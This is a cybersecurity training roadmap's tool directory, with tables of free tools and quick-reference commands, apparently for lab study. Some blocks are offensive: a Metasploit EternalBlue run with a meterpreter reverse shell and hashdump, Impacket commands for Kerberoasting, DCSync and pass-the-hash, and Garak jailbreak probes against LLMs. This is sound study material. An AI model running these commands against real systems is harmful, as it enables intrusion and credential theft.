# Reference — Master Tool Directory

> **All tools used across the roadmap, organized by category.**  
> **Every tool listed here is free. No subscriptions required.**

---

## Foundations

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **Wireshark** | Packet capture and analysis | 1.2 Networking | Yes |
| **tcpdump** | CLI packet capture | 1.2 Networking, 2.8 Blue Team | Yes |
| **GDB + pwndbg/peda** | Binary debugging | 2.5 Binary Exploitation | Yes |
| **Ghidra** | Reverse engineering / disassembly | 2.6 Reverse Engineering | Yes |
| **openssl** | Cryptographic operations | 1.3 Cryptography | Yes |
| **hashcat** | GPU hash cracking | 1.3 Cryptography, Track D | Yes |
| **john the ripper** | Password cracking (CPU) | 1.3 Cryptography | Yes |
| **CyberChef** | Encoding/encryption/decoding swiss army knife | 1.3 Cryptography | Self-host or web |

---

## Scanning & Enumeration

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **nmap** | Port scanning, service detection, NSE scripts | 1.2 Networking, 2.3 Pentest | Yes |
| **masscan** | High-speed asynchronous port scanning | 2.3 Pentest | Yes |
| **gobuster / feroxbuster** | Directory and file brute forcing | 2.1 Web Security | Yes |
| **ffuf** | Web and API fuzzing | 2.2 API Security | Yes |
| **enum4linux-ng** | SMB/RPC enumeration | 2.3 Pentest, Track D | Yes |
| **nikto** | Web server misconfiguration scanner | 2.1 Web Security, 2.3 Pentest | Yes |
| **kiterunner** | API endpoint discovery | 2.2 API Security | Yes |

### nmap Quick Reference

```bash
# Basic scan
nmap -sV -sC <target>

# Full port scan
nmap -p- -sV -sC -O --script vuln -oA full <target>

# Fast top ports
nmap --top-ports 1000 -sV <target>

# UDP scan
nmap -sU --top-ports 100 <target>

# SMB enumeration scripts
nmap -p445 --script smb-enum-shares,smb-enum-users,smb-os-discovery <target>

# HTTP enumeration scripts
nmap -p80,443 --script http-enum,http-title,http-methods <target>

# Aggressive (all defaults)
nmap -A <target>
```

---

## Web & API Attack

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **Burp Suite Community** | HTTP proxy, repeater, intruder (limited) | 2.1 Web, 2.2 API | Yes |
| **sqlmap** | SQL injection automation | 2.1 Web Security | Yes |
| **jwt_tool** | JWT attack toolkit | 2.1 Web Security | Yes |
| **graphql-cop** | GraphQL security testing | 2.2 API Security | Yes |
| **curl** | Raw HTTP requests | All phases | Yes |

### Burp Suite Community Limitations

| Feature | Community | Professional |
|---|---|---|
| Intruder speed | Throttled (1 thread) | Unlimited |
| Scanner | Manual only | Automated |
| Project saving | No | Yes |
| Extensions | Limited | Full |

> **Workaround for throttling:** Use Python scripts (requests + threading) for bulk operations.

---

## Exploitation

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **Metasploit (msfconsole)** | Exploit framework | 2.4 Exploitation | Yes |
| **msfvenom** | Payload generation | 2.4 Exploitation | Yes |
| **searchsploit** | Local ExploitDB search | 2.3 Pentest, 2.4 Exploitation | Yes |
| **pwntools** | CTF/binary exploitation Python library | 2.5 Binary Exploitation | Yes |
| **netcat (nc)** | Shells, port listening, pivoting | 1.2 Networking, 2.4 Exploitation | Yes |

### Metasploit Quick Reference

```bash
# Start
msfconsole

# Search for exploits
search type:exploit platform:windows name:ms17

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set required options
set RHOSTS 192.168.56.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.5

# Run
exploit

# Post-exploitation
meterpreter > getuid
meterpreter > shell
meterpreter > hashdump
```

---

## Post-Exploitation & Privilege Escalation

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **linpeas** | Linux privesc automated enumeration | 2.4 Exploitation | Yes |
| **winpeas** | Windows privesc automated enumeration | Track D | Yes |
| **BloodHound + Neo4j** | AD attack path mapping | Track D | Yes (Docker) |
| **Impacket** | Windows/AD protocol attacks (Python) | Track D | Yes |
| **CrackMapExec (CME)** | Network auth testing, lateral movement | Track D | Yes |
| **Responder** | LLMNR/NBT-NS poisoning | Track D | Yes |
| **Mimikatz** | Windows credential extraction | Track D | Windows only |

### Impacket Scripts Reference

```bash
# SMB enumeration
smbclient.py domain/user:password@target

# List users with no pre-auth (AS-REP Roasting)
GetNPUsers.py domain/ -dc-ip <ip> -usersfile users.txt -format hashcat -outputfile asrep.txt

# Kerberoasting
GetUserSPNs.py domain/user:password -dc-ip <ip> -request -outputfile krb.txt

# DCSync (Domain Admin required)
secretsdump.py domain/admin:password@dc01.domain.local

# Remote execution (Pass-the-Hash)
psexec.py -hashes LM:NT admin@target
wmiexec.py -hashes LM:NT admin@target
```

---

## Smart Contract Security

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **Slither** | Static analysis (vulnerability detection) | Track A | Yes |
| **Echidna** | Property-based fuzzing | Track A | Yes |
| **Mythril** | Symbolic execution | Track A | Yes |
| **Manticore** | Symbolic execution (complex) | Track A | Yes |
| **Foundry** (`forge`/`cast`/`anvil`) | Testing, PoC, local chain | Track A | Yes |
| **Hardhat** | Alternative dev environment | Track A | Yes |
| **Remix IDE** | Browser-based IDE | Track A | Local version available |

### Foundry Quick Reference

```bash
# Initialize project
forge init my-project

# Build
cd my-project && forge build

# Test
forge test

# Test with verbosity
forge test -vvvv

# Run specific test
forge test --match-test testReentrancy

# Fork test against mainnet
forge test --fork-url https://eth-mainnet.g.alchemy.com/v2/<key>

# Deploy locally
anvil
forge script script/Deploy.s.sol --rpc-url http://localhost:8545 --broadcast

# Cast commands
cast call <contract> "functionName()" --rpc-url http://localhost:8545
cast send <contract> "functionName()" --rpc-url http://localhost:8545 --private-key <key>
```

### Slither Quick Reference

```bash
# Run all detectors
slither .

# Run specific detector
slither . --detect reentrancy-eth,reentrancy-no-eth

# Filter by impact
slither . --filter-paths "node_modules|lib"

# Generate human summary
slither . --print human-summary

# Show inheritance graph
slither . --print inheritance-graph
```

---

## AI / ML Security

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **ART (IBM)** | Adversarial attack and defense library | Track B | Yes |
| **Foolbox** | Evasion attacks | Track B | Yes |
| **Garak** | LLM vulnerability scanning | Track B | Yes |
| **Ollama** | Local LLM hosting for red-teaming | Track B | Yes |
| **Fickling** | Pickle file security analysis | Track B | Yes |
| **PyRIT** | Microsoft AI red team toolkit | Track B | Yes |
| **LangChain** | Building LLM test pipelines | Track B | Yes |

### Ollama Quick Reference

```bash
# Install: https://ollama.com/download

# Pull models
ollama pull llama3.2
ollama pull mistral
ollama pull codellama

# Run interactive
ollama run llama3.2

# Run API server (for scripts)
ollama serve

# API endpoint: http://localhost:11434/api/generate
# List models: ollama list
```

### Garak Quick Reference

```bash
# Install
pip install garak

# Scan a model (requires API)
garak --model_type openai --model_name gpt-3.5-turbo --probes all

# Scan local Ollama model
garak --model_type ollama --model_name llama3.2 --probes encoding,dan

# Specific probes
garak --model_type ollama --model_name llama3.2 --probes encoding.Base64,encoding.Bracket
```

---

## Cloud & Infrastructure Security

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **LocalStack** | AWS API emulation (no cloud account) | Track C | Yes |
| **minikube / k3s** | Local Kubernetes | Track C | Yes |
| **Checkov** | IaC static analysis | Track C | Yes |
| **tfsec** | Terraform security scanning | Track C | Yes |
| **Trivy** | Container + IaC scanning | Track C | Yes |
| **kube-bench** | Kubernetes CIS benchmark | Track C | Yes |
| **kube-score** | K8s object recommendations | Track C | Yes |
| **Docker** | Container runtime | Track C | Yes |

### LocalStack Quick Reference

```bash
# Start LocalStack
docker run --rm -it -p 4566:4566 -p 4510-4559:4510-4559 localstack/localstack

# Configure AWS CLI for LocalStack
aws configure --profile localstack
# AWS Access Key ID: test
# AWS Secret Access Key: test
# Default region: us-east-1

# Use with endpoint
aws --profile localstack --endpoint-url=http://localhost:4566 s3 ls
aws --profile localstack --endpoint-url=http://localhost:4566 ec2 describe-instances

# Terraform provider configuration
provider "aws" {
  access_key = "test"
  secret_key = "test"
  region     = "us-east-1"
  
  endpoints {
    s3       = "http://localhost:4566"
    ec2      = "http://localhost:4566"
    iam      = "http://localhost:4566"
    lambda   = "http://localhost:4566"
    dynamodb = "http://localhost:4566"
  }
}
```

### minikube Quick Reference

```bash
# Start cluster
minikube start --driver=docker

# Get status
minikube status

# kubectl access
kubectl get nodes
kubectl get pods -A

# Dashboard
minikube dashboard

# SSH into node
minikube ssh

# Stop
minikube stop
```

---

## Secrets & Code Review

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **trufflehog** | Secret scanning in files and git history | 2.7 Code Review | Yes |
| **gitleaks** | Secrets in git repositories | 2.7 Code Review | Yes |
| **Semgrep** | Static analysis / code review patterns | 2.7 Code Review | Yes |
| **bandit** | Python security linting | 2.7 Code Review | Yes |
| **eslint-plugin-security** | JavaScript security linting | 2.7 Code Review | Yes |

### Semgrep Quick Reference

```bash
# Install
pip install semgrep

# Run on project
semgrep --config=auto .

# Run specific ruleset
semgrep --config=p/security-audit .
semgrep --config=p/owasp-top-ten .
semgrep --config=p/cwe-top-25 .

# Custom rule
semgrep --config=my-rule.yaml .

# Output formats
semgrep --json --output=results.json .
semgrep --sarif --output=results.sarif .
```

### Gitleaks Quick Reference

```bash
# Scan current repo
gitleaks detect --verbose

# Scan git history
gitleaks detect --source . --verbose

# Generate report
gitleaks detect --report-format json --report-path gitleaks-report.json

# Specific commit range
gitleaks detect --log-opts="--all --full-history"
```

---

## Defense & Monitoring

| Tool | Purpose | Phase | Local? |
|---|---|---|---|
| **Wazuh** | SIEM + EDR (self-hosted) | 2.8 Blue Team | Yes |
| **Suricata** | Network IDS/IPS | 2.8 Blue Team | Yes |
| **auditd** | Linux system call auditing | 2.8 Blue Team | Yes |
| **fail2ban** | Automated IP blocking | 2.8 Blue Team | Yes |
| **MITRE ATT&CK Navigator** | Adversary tactic mapping | 2.8 Blue Team | Web (offline available) |

### Wazuh Quick Reference

```bash
# Docker deployment
docker run -d --name wazuh-manager \
  -p 1514:1514 -p 1515:1515 -p 514:514/udp -p 55000:55000 \
  wazuh/wazuh-manager

# Agent installation (on target VMs)
curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -
echo "deb https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
apt update && apt install wazuh-agent

# Agent configuration: /var/ossec/etc/ossec.conf
# Point to manager IP: MANAGER_IP

# Useful rules locations
# /var/ossec/ruleset/rules/
# /var/ossec/etc/rules/local_rules.xml
```

---

## Quick Install Script (Kali)

```bash
#!/bin/bash
# install-tools.sh — Run on fresh Kali to install everything

set -e

echo "[*] Updating Kali..."
sudo apt update && sudo apt full-upgrade -y

echo "[*] Installing core tools..."
sudo apt install -y \
    wireshark tcpdump nmap masscan gobuster ffuf \
    enum4linux-ng nikto sqlmap john hashcat \
    metasploit-framework netcat-traditional \
    gdb ghidra \
    docker.io docker-compose \
    impacket-scripts crackmapexec responder \
    bloodhound neo4j \
    suricata auditd fail2ban \
    python3-pip python3-venv

echo "[*] Installing Python tools..."
pip3 install --user \
    pwntools requests scapy beautifulsoup4 \
    pyrit garak langchain \
    semgrep bandit trufflehog gitleaks

echo "[*] Installing Foundry..."
curl -L https://foundry.paradigm.xyz | bash
source ~/.bashrc
foundryup

echo "[*] Done! Verify with: nmap --version && forge --version"
```

---

**Back to index:** [ROADMAP-INDEX.md](ROADMAP-INDEX.md)

---

*v2 — Local-first · Free · No KYC · No Subscriptions*
